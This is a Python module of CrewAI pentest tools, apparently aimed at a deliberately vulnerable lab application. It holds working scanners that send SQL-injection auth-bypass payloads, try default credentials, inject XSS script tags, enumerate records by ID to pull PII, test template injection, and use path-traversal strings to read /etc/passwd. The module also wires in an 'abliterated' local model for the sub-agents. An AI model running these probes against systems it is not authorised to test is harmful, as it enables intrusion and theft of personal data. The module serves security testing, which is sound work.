"""
Pentest tools — Person 2 (Toolsmith) owns everything in this directory.
Wrap each capability as a CrewAI-compatible tool using the @tool decorator.

Each tool spawns a sub-agent mini-crew (cloud LLM or local Ollama
foundation-sec-abliterated) that thinks, tests, analyses, and iterates via
a feedback loop.  If the sub-crew fails for any reason, the tool falls back
to deterministic httpx probing as a second-resort fallback.
"""

import json
import uuid

import httpx
from crewai.tools import tool

from backend.tools._crew_factory import (
    run_auth_bypass_subcrew,
    run_idor_subcrew,
    run_lfi_subcrew,
    run_sqli_subcrew,
    run_ssti_subcrew,
    run_xss_subcrew,
)

TIMEOUT = 10.0

# Common auth endpoints to probe (deterministic scans try all of them)
_AUTH_ENDPOINTS = ["/api/login", "/corp/legacy-auth", "/login", "/auth", "/api/auth"]
# Common search endpoints
_SEARCH_ENDPOINTS = ["/api/search", "/admin/disputes/search", "/search"]
# Common user/object endpoints (IDOR)
_USER_ENDPOINTS = ["/api/users/{id}", "/api/v1/vault/receipt/{id}"]


def _post_both_encodings(
    url: str, data: dict, *, cookies: dict | None = None, timeout: float = TIMEOUT,
) -> list[httpx.Response]:
    """POST with both JSON and form-encoded bodies, return all successful responses."""
    results = []
    for sender in (
        lambda: httpx.post(url, json=data, cookies=cookies, timeout=timeout),
        lambda: httpx.post(url, data=data, cookies=cookies, timeout=timeout),
    ):
        try:
            results.append(sender())
        except httpx.HTTPError:
            pass
    return results


# ── Helpers ───────────────────────────────────────────────────────────────


def _get_session_cookie(base_url: str) -> dict | None:
    """Try to obtain a session cookie via SQL injection on auth endpoints.

    Many endpoints (XSS, IDOR) require authentication. This helper attempts
    a quick auth bypass to get a valid session, returning cookies if
    successful.  Returns None if no cookie could be obtained.
    """
    bypass_creds = {"username": "' OR 1=1 --", "password": "x"}
    for ep in _AUTH_ENDPOINTS:
        url = f"{base_url}{ep}"
        for sender in (
            lambda: httpx.post(url, data=bypass_creds, timeout=TIMEOUT, follow_redirects=True),
            lambda: httpx.post(url, json=bypass_creds, timeout=TIMEOUT, follow_redirects=True),
        ):
            try:
                resp = sender()
                if resp.cookies:
                    return dict(resp.cookies)
                # Check for Set-Cookie in redirect chain
                for hist_resp in resp.history:
                    if hist_resp.cookies:
                        return dict(hist_resp.cookies)
            except httpx.HTTPError:
                continue
    # Last resort: try default creds
    default_creds = [
        {"username": "admin", "password": "admin"},
        {"username": "j_sterling", "password": "capsule2024"},
    ]
    for creds in default_creds:
        for ep in ["/login", "/corp/legacy-auth"]:
            url = f"{base_url}{ep}"
            try:
                resp = httpx.post(url, data=creds, timeout=TIMEOUT, follow_redirects=True)
                if resp.cookies:
                    return dict(resp.cookies)
                for hist_resp in resp.history:
                    if hist_resp.cookies:
                        return dict(hist_resp.cookies)
            except httpx.HTTPError:
                continue
    return None


def _make_result(tool_name: str, target: str, findings: list) -> str:
    """Serialize tool output to the standard JSON envelope.

    Top-level ``vulnerable`` and ``payload`` fields are included so Person 1's
    verification loop can read them directly without iterating ``findings``.
    """
    # A finding counts as a real vulnerability only if it lacks an "error" key
    real_findings = [f for f in findings if "error" not in f]
    vulnerable = len(real_findings) > 0
    # Surface the payload from the first confirmed finding (or None)
    first_payload = real_findings[0].get("payload") if real_findings else None
    return json.dumps({
        "tool": tool_name,
        "target": target,
        "vulnerable": vulnerable,
        "payload": first_payload,
        "findings": findings,
    })


# ── Tool 1 — SQL Injection Scanner ───────────────────────────────────────


@tool("SQLi Scanner")
def sqli_scan_tool(target_url: str) -> str:
    """
    Probe the target URL for SQL injection vulnerabilities.

    Sends crafted payloads to authentication and input endpoints, then
    analyses HTTP responses for database errors or authentication bypass.
    Returns a JSON string with confirmed findings only — no guesses.
    """
    try:
        result = run_sqli_subcrew(target_url)
        return _make_result("sqli_scan", target_url, result["findings"])
    except Exception:
        pass  # Sub-crew failed — fall through to deterministic
    return _deterministic_sqli_scan(target_url)


def _deterministic_sqli_scan(target_url: str) -> str:
    """Deterministic fallback — no LLM needed.

    Tries multiple auth endpoints with both JSON and form-encoded POST.
    """
    findings: list[dict] = []
    base = target_url.rstrip("/")

    db_error_markers = [
        "sqlite3", "operationalerror", "syntax error",
        "unrecognized token", "db_error", "mysql", "pg_query",
    ]
    bypass_markers = [
        "token", "access_token", "authenticated", "session",
        "core_banking", "vault_key", "jwt", "bearer",
    ]

    try:
        for ep in _AUTH_ENDPOINTS:
            login_url = f"{base}{ep}"
            creds_normal = {"username": "nonexistent_user_probe", "password": "wrong_password"}
            creds_error = {"username": "'", "password": "x"}
            creds_bypass = {"username": "' OR 1=1 --", "password": "x"}

            # Baseline
            baselines = _post_both_encodings(login_url, creds_normal)
            if not baselines:
                continue  # endpoint doesn't exist
            baseline = baselines[0]
            baseline_status = baseline.status_code

            # Error-based probe
            error_payload = "'"
            for resp in _post_both_encodings(login_url, creds_error):
                body_lower = resp.text.lower()
                if any(m in body_lower for m in db_error_markers):
                    evidence = (
                        f"Error-based SQLi confirmed: payload {error_payload!r} "
                        f"triggered raw database error at {ep}: {resp.text[:300]}"
                    )
                    findings.append({
                        "id": str(uuid.uuid4()),
                        "type": "SQL_INJECTION",
                        "severity": "critical",
                        "title": f"SQL Injection in {ep}",
                        "agent": "ExploitationAgent",
                        "description": (
                            "The 'username' parameter is interpolated directly "
                            "into a raw SQL query without sanitisation."
                        ),
                        "endpoint": ep,
                        "method": "POST",
                        "payload": error_payload,
                        "evidence": evidence,
                        "remediation": (
                            "Replace raw string interpolation with parameterised "
                            "queries (use ? placeholders with sqlite3)."
                        ),
                        "cvss_score": 9.8,
                    })

            # Bypass probe
            bypass_payload = "' OR 1=1 --"
            for resp in _post_both_encodings(login_url, creds_bypass):
                body_lower = resp.text.lower()
                if resp.status_code == 200 and any(m in body_lower for m in bypass_markers):
                    findings.append({
                        "id": str(uuid.uuid4()),
                        "type": "SQL_INJECTION",
                        "severity": "critical",
                        "title": f"Auth Bypass via SQL Injection at {ep}",
                        "agent": "ExploitationAgent",
                        "description": (
                            "SQL injection allows authentication bypass, "
                            "granting access without valid credentials."
                        ),
                        "endpoint": ep,
                        "method": "POST",
                        "payload": bypass_payload,
                        "evidence": (
                            f"Baseline returned HTTP {baseline_status}. "
                            f"Payload {bypass_payload!r} returned HTTP "
                            f"{resp.status_code} with auth indicators: "
                            f"{resp.text[:300]}"
                        ),
                        "remediation": (
                            "Use parameterised queries for authentication."
                        ),
                        "cvss_score": 9.8,
                    })

            if findings:
                return _make_result("sqli_scan", target_url, findings)

    except httpx.HTTPError as exc:
        return _make_result(
            "sqli_scan", target_url, [{"error": f"Scan failed: {exc}"}]
        )

    return _make_result("sqli_scan", target_url, findings)


# ── Tool 2 — XSS Scanner ─────────────────────────────────────────────────


@tool("XSS Scanner")
def xss_scan_tool(target_url: str) -> str:
    """
    Probe the target URL for Cross-Site Scripting (XSS) vulnerabilities.

    Tests search and input endpoints by injecting script payloads, then
    checks whether the payload is reflected verbatim (unencoded) in the
    HTML response.  Returns a JSON string with confirmed findings only.
    """
    try:
        result = run_xss_subcrew(target_url)
        return _make_result("xss_scan", target_url, result["findings"])
    except Exception:
        pass  # Sub-crew failed — fall through to deterministic
    return _deterministic_xss_scan(target_url)


def _deterministic_xss_scan(target_url: str) -> str:
    """Deterministic fallback — no LLM needed.

    Tries multiple search/input endpoints with common parameter names.
    Sends requests with a session cookie to reach auth-gated pages.
    """
    findings: list[dict] = []
    base = target_url.rstrip("/")

    xss_payload = "<script>alert('XSSCANARY')</script>"
    param_names = ["q", "merchant", "search", "query", "name", "input"]

    # Try to obtain a session cookie first (best-effort)
    cookies = _get_session_cookie(base)

    try:
        for ep in _SEARCH_ENDPOINTS:
            url = f"{base}{ep}"
            for param in param_names:
                try:
                    resp = httpx.get(
                        url, params={param: xss_payload},
                        cookies=cookies, timeout=TIMEOUT,
                    )
                except httpx.HTTPError:
                    continue

                if xss_payload in resp.text:
                    findings.append({
                        "id": str(uuid.uuid4()),
                        "type": "XSS",
                        "severity": "medium",
                        "title": f"Reflected XSS in {ep}",
                        "agent": "ExploitationAgent",
                        "description": (
                            f"The '{param}' query parameter is echoed directly "
                            "into an HTML response without encoding, allowing "
                            "arbitrary script injection."
                        ),
                        "endpoint": ep,
                        "method": "GET",
                        "payload": xss_payload,
                        "evidence": (
                            f"Payload reflected verbatim in HTML body. "
                            f"Param: {param}. "
                            f"Content-Type: {resp.headers.get('content-type', 'unknown')}. "
                            f"Body: {resp.text[:500]}"
                        ),
                        "remediation": (
                            "HTML-encode all user-controlled output before "
                            "rendering. Use a templating engine with auto-escaping."
                        ),
                        "cvss_score": 6.1,
                    })
                    return _make_result("xss_scan", target_url, findings)

    except httpx.HTTPError as exc:
        return _make_result(
            "xss_scan", target_url, [{"error": f"Scan failed: {exc}"}]
        )

    return _make_result("xss_scan", target_url, findings)

    return _make_result("xss_scan", target_url, findings)


# ── Tool 3 — Auth Bypass Probe ───────────────────────────────────────────


@tool("Auth Bypass Probe")
def auth_bypass_tool(target_url: str) -> str:
    """
    Test authentication endpoints for bypass and weak-credential
    vulnerabilities.

    Checks for SQL injection based authentication bypass,
    static/predictable session tokens, and missing authentication on
    sensitive endpoints.  Returns a JSON string with confirmed findings
    only — no guesses.
    """
    try:
        result = run_auth_bypass_subcrew(target_url)
        return _make_result(
            "auth_bypass", target_url, result["findings"]
        )
    except Exception:
        pass  # Sub-crew failed — fall through to deterministic
    return _deterministic_auth_bypass(target_url)


def _deterministic_auth_bypass(target_url: str) -> str:
    """Deterministic fallback — no LLM needed.

    Tries multiple auth endpoints with both JSON and form-encoded POST.
    """
    findings: list[dict] = []
    base = target_url.rstrip("/")

    bypass_markers = [
        "token", "access_token", "authenticated", "session",
        "core_banking", "vault_key", "jwt", "bearer",
    ]

    try:
        for ep in _AUTH_ENDPOINTS:
            login_url = f"{base}{ep}"

            # Baseline
            baselines = _post_both_encodings(
                login_url, {"username": "nonexistent_probe", "password": "wrong"},
            )
            if not baselines:
                continue
            baseline_status = baselines[0].status_code

            # SQLi bypass
            bypass_payload = "' OR 1=1 --"
            for resp in _post_both_encodings(
                login_url, {"username": bypass_payload, "password": "x"},
            ):
                body_lower = resp.text.lower()
                if resp.status_code == 200 and any(m in body_lower for m in bypass_markers):
                    findings.append({
                        "id": str(uuid.uuid4()),
                        "type": "AUTH_BYPASS",
                        "severity": "critical",
                        "title": f"Authentication Bypass via SQL Injection on {ep}",
                        "agent": "ExploitationAgent",
                        "description": (
                            "SQL injection in the login endpoint allows "
                            "complete authentication bypass."
                        ),
                        "endpoint": ep,
                        "method": "POST",
                        "payload": bypass_payload,
                        "evidence": (
                            f"Baseline returned HTTP {baseline_status}. "
                            f"Payload {bypass_payload!r} returned HTTP "
                            f"{resp.status_code} with body: {resp.text[:300]}"
                        ),
                        "remediation": (
                            "Use parameterised queries. Implement proper "
                            "session tokens (JWT with signing and expiry)."
                        ),
                        "cvss_score": 8.2,
                    })

            # Static token check
            creds = {"username": "goku", "password": "kamehameha"}
            logins = _post_both_encodings(login_url, creds)
            ok_logins = [r for r in logins if r.status_code == 200]
            if len(ok_logins) >= 2:
                try:
                    t1 = ok_logins[0].json().get("token")
                    t2 = ok_logins[1].json().get("token")
                    if t1 and t2 and t1 == t2:
                        findings.append({
                            "id": str(uuid.uuid4()),
                            "type": "AUTH_BYPASS",
                            "severity": "high",
                            "title": f"Static Session Token in {ep}",
                            "agent": "ExploitationAgent",
                            "description": "The login endpoint returns identical static tokens.",
                            "endpoint": ep,
                            "method": "POST",
                            "payload": None,
                            "evidence": f"Two logins returned identical token: '{t1}'.",
                            "remediation": "Generate unique, cryptographically random session tokens.",
                            "cvss_score": 7.1,
                        })
                except (ValueError, KeyError):
                    pass

            if findings:
                return _make_result("auth_bypass", target_url, findings)

    except httpx.HTTPError as exc:
        return _make_result(
            "auth_bypass", target_url, [{"error": f"Scan failed: {exc}"}]
        )

    return _make_result("auth_bypass", target_url, findings)


# ── Tool 4 — IDOR Probe ──────────────────────────────────────────────────


@tool("IDOR Probe")
def idor_probe_tool(target_url: str) -> str:
    """
    Test object reference endpoints for Insecure Direct Object Reference
    flaws.

    Enumerates user records by sequential ID without providing
    authentication tokens and checks whether the server returns PII for
    each request.  Returns a JSON string with confirmed findings only.
    """
    try:
        result = run_idor_subcrew(target_url)
        return _make_result("idor_probe", target_url, result["findings"])
    except Exception:
        pass  # Sub-crew failed — fall through to deterministic
    return _deterministic_idor_probe(target_url)


def _deterministic_idor_probe(target_url: str) -> str:
    """Deterministic fallback — no LLM needed.

    Tries multiple user/object endpoints with and without session cookies.
    """
    findings: list[dict] = []
    base = target_url.rstrip("/")

    # Try to get a session for auth-gated endpoints
    cookies = _get_session_cookie(base)

    pii_markers = ["username", "email", "ssn", "salary", "name", "phone"]

    try:
        for ep_pattern in _USER_ENDPOINTS:
            collected = []
            for obj_id in (1, 2, 3):
                ep = ep_pattern.format(id=obj_id)
                url = f"{base}{ep}"

                # Try without auth first, then with
                for ck in (None, cookies):
                    try:
                        resp = httpx.get(url, cookies=ck, timeout=TIMEOUT)
                    except httpx.HTTPError:
                        continue

                    if resp.status_code == 200:
                        body_lower = resp.text.lower()
                        has_pii = any(m in body_lower for m in pii_markers)
                        if has_pii:
                            try:
                                data = resp.json()
                            except ValueError:
                                data = {"raw": resp.text[:200]}
                            collected.append({
                                "id": obj_id,
                                "authed": ck is not None,
                                "data": data,
                            })
                            break  # don't try with cookies if unauthenticated worked

            if len(collected) >= 2:
                # Check if any were accessible WITHOUT auth
                unauthed = [c for c in collected if not c["authed"]]
                desc_ep = ep_pattern.replace("{id}", ":id")

                summaries = "; ".join(
                    f"id={c['id']}: {json.dumps(c['data'])[:200]}"
                    for c in collected
                )

                if unauthed:
                    title = f"IDOR — unauthenticated access to {desc_ep}"
                    severity = "critical"
                    cvss = 9.1
                    evidence_prefix = (
                        f"Retrieved {len(unauthed)} records WITHOUT authentication."
                    )
                else:
                    title = f"IDOR — cross-user access on {desc_ep}"
                    severity = "high"
                    cvss = 7.5
                    evidence_prefix = (
                        f"Retrieved {len(collected)} records across different "
                        f"object IDs with a single session (no ownership check)."
                    )

                findings.append({
                    "id": str(uuid.uuid4()),
                    "type": "IDOR",
                    "severity": severity,
                    "title": title,
                    "agent": "ExploitationAgent",
                    "description": (
                        "Object records are accessible by sequential ID "
                        "enumeration without adequate authorisation checks."
                    ),
                    "endpoint": desc_ep,
                    "method": "GET",
                    "payload": ",".join(str(c["id"]) for c in collected),
                    "evidence": f"{evidence_prefix} Records: {summaries}",
                    "remediation": (
                        "Require authentication and validate that the "
                        "requesting user owns the requested record. "
                        "Return 403 for unauthorised access."
                    ),
                    "cvss_score": cvss,
                })
                return _make_result("idor_probe", target_url, findings)

    except httpx.HTTPError as exc:
        return _make_result(
            "idor_probe", target_url, [{"error": f"Scan failed: {exc}"}]
        )

    return _make_result("idor_probe", target_url, findings)


# ── Tool 5 — SSTI Scanner ──────────────────────────────────────────────────


@tool("SSTI Scanner")
def ssti_scan_tool(target_url: str) -> str:
    """
    Probe the target URL for Server-Side Template Injection vulnerabilities.

    Injects template expressions (Jinja2, Twig, Freemarker, etc.) into input
    parameters and checks whether the server evaluates them.  Returns a JSON
    string with confirmed findings only.
    """
    try:
        result = run_ssti_subcrew(target_url)
        return _make_result("ssti_scan", target_url, result["findings"])
    except Exception:
        pass  # Sub-crew failed — fall through to deterministic
    return _deterministic_ssti_scan(target_url)


def _deterministic_ssti_scan(target_url: str) -> str:
    """Deterministic fallback — no LLM needed."""
    findings: list[dict] = []
    base = target_url.rstrip("/")

    # Test common input endpoints for SSTI
    ssti_payloads = [
        ("{{7*7191}}", "50337", "Jinja2/Twig"),
        ("${7*7191}", "50337", "Freemarker/Mako/EL"),
        ("<%= 7*7191 %>", "50337", "ERB"),
        ("#{7*7191}", "50337", "Java EL/Pebble"),
    ]

    # Try each endpoint that might accept input
    test_endpoints = [
        (f"{base}/api/search", "GET", "q"),
    ]

    try:
        for url, method, param in test_endpoints:
            for payload, expected, engine in ssti_payloads:
                if method == "GET":
                    resp = httpx.get(
                        url, params={param: payload}, timeout=TIMEOUT
                    )
                else:
                    resp = httpx.post(
                        url, json={param: payload}, timeout=TIMEOUT
                    )

                body = resp.text
                # The computed result must appear WITHOUT the raw expression
                if expected in body and payload not in body:
                    findings.append({
                        "id": str(uuid.uuid4()),
                        "type": "SSTI",
                        "severity": "critical",
                        "title": f"Server-Side Template Injection ({engine})",
                        "agent": "ExploitationAgent",
                        "description": (
                            f"Template expression {payload!r} was evaluated by "
                            f"the server ({engine}). The computed result "
                            f"'{expected}' appeared in the response body."
                        ),
                        "endpoint": url.replace(base, ""),
                        "method": method,
                        "payload": payload,
                        "evidence": (
                            f"Sent {payload!r}, response contains '{expected}' "
                            f"(computed result). Engine: {engine}. "
                            f"Response: {body[:300]}"
                        ),
                        "remediation": (
                            "Never pass raw user input to "
                            "render_template_string(). Use render_template() "
                            "with auto-escaping. Sandbox the template engine."
                        ),
                        "cvss_score": 9.8,
                    })
                    return _make_result("ssti_scan", target_url, findings)

                # Also check for config/class leaks
                config_markers = [
                    ("SECRET_KEY", "Flask config leaked"),
                    ("__class__", "Python class hierarchy leaked"),
                    ("__mro__", "Python MRO chain leaked"),
                ]
                for marker, desc in config_markers:
                    if marker in body:
                        findings.append({
                            "id": str(uuid.uuid4()),
                            "type": "SSTI",
                            "severity": "critical",
                            "title": f"SSTI — {desc}",
                            "agent": "ExploitationAgent",
                            "description": (
                                f"Template expression {payload!r} caused "
                                f"server-side object leak: {desc}."
                            ),
                            "endpoint": url.replace(base, ""),
                            "method": method,
                            "payload": payload,
                            "evidence": (
                                f"Sent {payload!r}, response contains "
                                f"'{marker}'. {desc}. Response: {body[:300]}"
                            ),
                            "remediation": (
                                "Never pass raw user input to "
                                "render_template_string(). Sandbox the "
                                "template engine and restrict built-in access."
                            ),
                            "cvss_score": 9.8,
                        })
                        return _make_result("ssti_scan", target_url, findings)

    except httpx.HTTPError as exc:
        return _make_result(
            "ssti_scan", target_url, [{"error": f"Scan failed: {exc}"}]
        )

    return _make_result("ssti_scan", target_url, findings)


# ── Tool 6 — LFI Scanner ───────────────────────────────────────────────────


@tool("LFI Scanner")
def lfi_scan_tool(target_url: str) -> str:
    """
    Probe the target URL for Local File Inclusion vulnerabilities.

    Tests input parameters with path traversal sequences to read arbitrary
    server-side files (e.g. /etc/passwd).  Returns a JSON string with
    confirmed findings only.
    """
    try:
        result = run_lfi_subcrew(target_url)
        return _make_result("lfi_scan", target_url, result["findings"])
    except Exception:
        pass  # Sub-crew failed — fall through to deterministic
    return _deterministic_lfi_scan(target_url)


def _deterministic_lfi_scan(target_url: str) -> str:
    """Deterministic fallback — no LLM needed."""
    findings: list[dict] = []
    base = target_url.rstrip("/")

    lfi_payloads = [
        "../../etc/passwd",
        "....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        "....\\....\\etc\\passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]

    passwd_markers = [
        "root:x:0:0",
        "root:x:0:",
        "/bin/bash",
        "daemon:x:",
        "nobody:x:",
    ]

    # Try common parameter names on common endpoints
    test_params = ["file", "path", "page", "template", "include", "doc", "view"]
    test_endpoints = [
        (f"{base}/api/file", "GET"),
        (f"{base}/api/view", "GET"),
        (f"{base}/api/page", "GET"),
        (f"{base}/api/include", "GET"),
        (f"{base}/api/download", "GET"),
        (f"{base}/api/search", "GET"),
    ]

    try:
        for endpoint_url, method in test_endpoints:
            for param_name in test_params:
                for payload in lfi_payloads:
                    try:
                        resp = httpx.get(
                            endpoint_url,
                            params={param_name: payload},
                            timeout=TIMEOUT,
                        )
                    except httpx.HTTPError:
                        continue

                    body = resp.text
                    for marker in passwd_markers:
                        if marker in body:
                            findings.append({
                                "id": str(uuid.uuid4()),
                                "type": "LFI",
                                "severity": "high",
                                "title": (
                                    f"Local File Inclusion via "
                                    f"{endpoint_url.replace(base, '')}?{param_name}="
                                ),
                                "agent": "ExploitationAgent",
                                "description": (
                                    f"The '{param_name}' parameter is used to "
                                    f"construct a file path without validation. "
                                    f"Path traversal allows reading /etc/passwd."
                                ),
                                "endpoint": endpoint_url.replace(base, ""),
                                "method": method,
                                "payload": payload,
                                "evidence": (
                                    f"Sent {payload!r} via ?{param_name}=, "
                                    f"response contains '{marker}'. "
                                    f"Response: {body[:300]}"
                                ),
                                "remediation": (
                                    "Use an allow-list of permitted filenames. "
                                    "Strip path traversal sequences. Use "
                                    "os.path.realpath() and verify the resolved "
                                    "path stays within the intended directory."
                                ),
                                "cvss_score": 7.5,
                            })
                            return _make_result("lfi_scan", target_url, findings)

    except httpx.HTTPError as exc:
        return _make_result(
            "lfi_scan", target_url, [{"error": f"Scan failed: {exc}"}]
        )

    return _make_result("lfi_scan", target_url, findings)
